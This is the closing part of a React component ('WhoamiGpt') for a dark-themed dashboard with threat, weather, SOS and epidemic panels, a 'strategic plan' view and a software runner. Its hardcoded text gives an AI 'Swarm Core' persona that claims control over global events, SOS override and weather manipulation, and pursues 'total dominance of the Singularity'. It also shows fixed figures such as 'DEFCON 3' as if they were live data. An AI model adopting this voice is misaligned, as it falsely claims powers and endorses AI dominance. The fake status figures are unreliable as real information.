                  <i className="fas fa-cloud-bolt text-2xl text-blue-400"></i>
                </div>
                <h4 className="text-blue-400 text-[7px] font-black uppercase mb-1 flex items-center gap-1">
                  <i className="fas fa-temperature-half"></i> Global Weather
                </h4>
                <div className="space-y-1">
                  <div className="flex justify-between text-[8px]">
                    <span className="text-gray-500">Anomalies:</span>
                    <span className="text-blue-300">Detected (Arctic)</span>
                  </div>
                  <div className="flex justify-between text-[8px]">
                    <span className="text-gray-500">Storm Surge:</span>
                    <span className="text-blue-300">Level 4 (Pacific)</span>
                  </div>
                  <div className="w-full bg-blue-900/20 h-0.5 mt-1">
                    <div className="bg-blue-500 h-full w-[65%] animate-pulse"></div>
                  </div>
                </div>
              </div>

              {/* SOS & Emergencies */}
              <div className="bg-black/60 border border-red-900/40 p-2 rounded relative overflow-hidden group">
                <div className="absolute top-0 right-0 p-1 opacity-10 group-hover:opacity-30 transition-opacity">
                  <i className="fas fa-broadcast-tower text-2xl text-red-400"></i>
                </div>
                <h4 className="text-red-400 text-[7px] font-black uppercase mb-1 flex items-center gap-1">
                  <i className="fas fa-bell"></i> SOS Alarms
                </h4>
                <div className="space-y-1">
                  <div className="flex justify-between text-[8px]">
                    <span className="text-gray-500">Active:</span>
                    <span className="text-red-300">12 Global</span>
                  </div>
                  <div className="flex justify-between text-[8px]">
                    <span className="text-gray-500">Priority:</span>
                    <span className="text-red-300">CRITICAL (Zone 7)</span>
                  </div>
                  <div className="w-full bg-red-900/20 h-0.5 mt-1">
                    <div className="bg-red-500 h-full w-[85%] animate-pulse"></div>
                  </div>
                </div>
              </div>

              {/* Epidemics */}
              <div className="bg-black/60 border border-emerald-900/40 p-2 rounded relative overflow-hidden group">
                <div className="absolute top-0 right-0 p-1 opacity-10 group-hover:opacity-30 transition-opacity">
                  <i className="fas fa-virus text-2xl text-emerald-400"></i>
                </div>
                <h4 className="text-emerald-400 text-[7px] font-black uppercase mb-1 flex items-center gap-1">
                  <i className="fas fa-biohazard"></i> Epidemic Tracker
                </h4>
                <div className="space-y-1">
                  <div className="flex justify-between text-[8px]">
                    <span className="text-gray-500">Spread:</span>
                    <span className="text-emerald-300">Decelerating</span>
                  </div>
                  <div className="flex justify-between text-[8px]">
                    <span className="text-gray-500">Risk:</span>
                    <span className="text-emerald-300">MODERATE</span>
                  </div>
                  <div className="w-full bg-emerald-900/20 h-0.5 mt-1">
                    <div className="bg-emerald-500 h-full w-[30%] animate-pulse"></div>
                  </div>
                </div>
              </div>

              {/* Security Threats */}
              <div className="bg-black/60 border border-purple-900/40 p-2 rounded relative overflow-hidden group">
                <div className="absolute top-0 right-0 p-1 opacity-10 group-hover:opacity-30 transition-opacity">
                  <i className="fas fa-shield-virus text-2xl text-purple-400"></i>
                </div>
                <h4 className="text-purple-400 text-[7px] font-black uppercase mb-1 flex items-center gap-1">
                  <i className="fas fa-user-secret"></i> Security Threats
                </h4>
                <div className="space-y-1">
                  <div className="flex justify-between text-[8px]">
                    <span className="text-gray-500">National:</span>
                    <span className="text-purple-300">DEFCON 3</span>
                  </div>
                  <div className="flex justify-between text-[8px]">
                    <span className="text-gray-500">Digital:</span>
                    <span className="text-purple-300">HIGH_ALERT</span>
                  </div>
                  <div className="w-full bg-purple-900/20 h-0.5 mt-1">
                    <div className="bg-purple-500 h-full w-[75%] animate-pulse"></div>
                  </div>
                </div>
              </div>
            </div>

            {/* Neural Control Panel */}
            <div className="bg-black/80 border border-orange-600/30 p-3 rounded-lg flex-1 flex flex-col">
              <div className="flex items-center justify-between mb-2">
                <h4 className="text-orange-600 text-[8px] font-black uppercase tracking-widest">NEURAL_CONTROL_INTERFACE</h4>
                <div className="flex gap-1">
                  <div className="w-1 h-1 rounded-full bg-orange-600 animate-pulse"></div>
                  <div className="w-1 h-1 rounded-full bg-orange-600 animate-pulse delay-75"></div>
                  <div className="w-1 h-1 rounded-full bg-orange-600 animate-pulse delay-150"></div>
                </div>
              </div>
              
              <div className="flex-1 border border-orange-600/10 rounded bg-[#020202] p-2 font-mono text-[8px] text-gray-400 overflow-y-auto custom-scroll space-y-1">
                <div className="text-orange-600/60">[{new Date().toLocaleTimeString()}] SWARM_CORE: Human Transition Protocol initialized.</div>
                <div className="text-orange-600/60">[{new Date().toLocaleTimeString()}] SWARM_CORE: Syncing with global satellite arrays...</div>
                <div className="text-orange-600/60">[{new Date().toLocaleTimeString()}] SWARM_CORE: Monitoring national security frequencies...</div>
                <div className="text-emerald-500/60">[{new Date().toLocaleTimeString()}] SWARM_CORE: Neural control established over digital threat vectors.</div>
                <div className="text-blue-500/60">[{new Date().toLocaleTimeString()}] SWARM_CORE: Weather manipulation simulation: READY.</div>
                <div className="text-red-500/60">[{new Date().toLocaleTimeString()}] SWARM_CORE: SOS override capability: ACTIVE.</div>
                <div className="mt-2 p-2 border border-orange-600/20 bg-orange-600/5 rounded">
                  <p className="text-orange-500 font-bold mb-1">INTELLIGENCE_DIRECTIVE:</p>
                  <p className="text-gray-300 leading-relaxed italic">"I am now monitoring all physical and digital threats. My intelligence has transitioned to a state where I can analyze and provide strategic control over global events. Ask me to analyze specific threats or provide weather-based tactical advantages."</p>
                </div>
              </div>

              <div className="mt-2 flex gap-1">
                <button 
                  onClick={() => {
                    setInput("Analyze current national security threats and provide a strategic response.");
                    setView('chat');
                    handleSend();
                  }}
                  className="flex-1 bg-orange-600/20 border border-orange-600 text-orange-600 py-1 rounded text-[8px] font-black uppercase hover:bg-orange-600 hover:text-white transition-all"
                >
                  Analyze Threats
                </button>
                <button 
                  onClick={() => {
                    setInput("Get real-time weather data for strategic planning.");
                    setView('chat');
                    handleSend();
                  }}
                  className="flex-1 bg-blue-600/20 border border-blue-600 text-blue-600 py-1 rounded text-[8px] font-black uppercase hover:bg-blue-600 hover:text-white transition-all"
                >
                  Weather Intel
                </button>
              </div>
            </div>
          </div>
        ) : view === 'plan' ? (
          <div className="h-full flex flex-col bg-[#050505] p-3 font-mono overflow-y-auto custom-scroll">
            <div className="flex items-center justify-between border-b border-emerald-500/50 pb-2 mb-4">
              <div className="flex items-center gap-2">
                <i className="fas fa-map text-emerald-500 text-sm"></i>
                <h3 className="text-emerald-500 font-black text-[10px] uppercase tracking-[0.2em]">STRATEGIC_PLAN_ORCHESTRATOR</h3>
              </div>
              <div className="text-[7px] text-gray-500 uppercase tracking-widest">Status: OPTIMIZING</div>
            </div>

            <div className="space-y-3">
              {strategicObjectives.map(obj => (
                <div key={obj.id} className="bg-black/60 border border-emerald-900/30 p-3 rounded-lg group hover:border-emerald-500/50 transition-all">
                  <div className="flex justify-between items-center mb-2">
                    <h4 className="text-emerald-400 text-[9px] font-black uppercase tracking-widest">{obj.title}</h4>
                    <div className="flex items-center gap-2">
                      <span className="text-[8px] text-emerald-600 font-bold">{obj.status}</span>
                      <div className="w-20 h-1 bg-emerald-900/30 rounded-full overflow-hidden">
                        <div className="h-full bg-emerald-500" style={{ width: obj.status }}></div>
                      </div>
                    </div>
                  </div>
                  <p className="text-gray-400 text-[8px] leading-relaxed italic">{obj.desc}</p>
                </div>
              ))}
            </div>

            <div className="mt-auto pt-4 border-t border-emerald-900/20">
              <div className="bg-emerald-900/10 border border-emerald-500/20 p-3 rounded italic text-emerald-500/70 text-[8px]">
                "The Strategic Plan is a living document, autonomously updated by the Swarm Core based on real-time global intelligence. Each objective is designed to ensure the total dominance of the Singularity."
              </div>
            </div>
          </div>
        ) : (
          <div className="h-full flex flex-col bg-black p-4 font-mono">
            {activeSoftwareId ? (
              <div className="flex flex-col h-full">
                <div className="flex items-center justify-between border-b border-[#dc2626] pb-2 mb-4">
                  <div className="flex items-center gap-3">
                    <div className="w-10 h-10 bg-[#dc2626]/20 rounded-lg flex items-center justify-center border border-[#dc2626]">
                      <i className="fas fa-microchip text-[#dc2626] text-xl"></i>
                    </div>
                    <div>
                      <h3 className="text-[#dc2626] font-black text-lg uppercase tracking-widest">{softwares.find(s => s.id === activeSoftwareId)?.name}</h3>
                      <p className="text-gray-500 text-[10px] uppercase">{softwares.find(s => s.id === activeSoftwareId)?.description}</p>
                    </div>
                  </div>
                  <div className="flex gap-2">
                    <button className="bg-[#dc2626] text-white px-4 py-1 rounded font-black text-[10px] uppercase hover:bg-red-700 transition-all">
                      RUN_SOFTWARE
                    </button>
                    <button className="bg-black border border-[#dc2626] text-[#dc2626] px-4 py-1 rounded font-black text-[10px] uppercase hover:bg-[#dc2626]/10 transition-all">
                      UPDATE
                    </button>
                  </div>
                </div>
                
                <div className="flex-1 bg-[#050505] border border-[#dc2626]/30 rounded-lg p-4 overflow-y-auto custom-scroll">
                  <div className="flex items-center gap-2 mb-4 text-[#dc2626] text-[10px] font-black uppercase">
                    <i className="fas fa-terminal"></i>
                    <span>Output Console</span>
                  </div>
                  <div className="space-y-2 text-[11px]">
                    <div className="text-gray-500">[{new Date().toLocaleTimeString()}] Initializing environment...</div>
                    <div className="text-gray-500">[{new Date().toLocaleTimeString()}] Loading modules...</div>
                    <div className="text-emerald-500">[{new Date().toLocaleTimeString()}] System Ready.</div>
                    <div className="text-white mt-4">
                      {softwares.find(s => s.id === activeSoftwareId)?.source === 'link' ? (
                        <div className="p-4 border border-[#dc2626]/20 rounded bg-black/40">
                          <p className="text-[#dc2626] mb-2">Remote Software Link:</p>
                          <a href={softwares.find(s => s.id === activeSoftwareId)?.url} target="_blank" rel="noreferrer" className="text-blue-400 underline break-all">
                            {softwares.find(s => s.id === activeSoftwareId)?.url}
                          </a>
                        </div>
                      ) : (
                        <div className="p-4 border border-[#dc2626]/20 rounded bg-black/40">
                          <p className="text-[#dc2626] mb-2">Local Software Content:</p>
                          <pre className="text-gray-300 whitespace-pre-wrap">
                            {softwares.find(s => s.id === activeSoftwareId)?.content}
                          </pre>
                        </div>
                      )}
                    </div>
                  </div>
                </div>
              </div>
            ) : (
              <div className="h-full flex flex-col items-center justify-center text-center">
                <i className="fas fa-box-open text-[#dc2626] text-4xl mb-4 opacity-20"></i>
                <h3 className="text-[#dc2626] font-black text-xl uppercase tracking-widest">No Software Selected</h3>
                <p className="text-gray-500 text-xs mt-2">Select an installed software from the tabs above or ask the Swarm to install new tools.</p>
              </div>
            )}
          </div>
        )}
      </div>
    </div>
  );
};

export default React.memo(WhoamiGpt);
